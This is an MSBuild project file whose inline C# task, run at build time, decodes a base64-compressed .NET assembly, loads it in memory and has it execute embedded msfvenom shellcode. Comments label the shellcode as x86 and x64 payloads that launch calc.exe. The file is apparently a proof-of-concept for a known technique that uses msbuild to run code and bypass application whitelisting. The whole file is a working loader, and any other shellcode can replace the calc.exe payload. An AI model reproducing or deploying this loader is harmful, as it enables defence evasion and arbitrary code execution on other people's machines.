<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
                
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example1");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

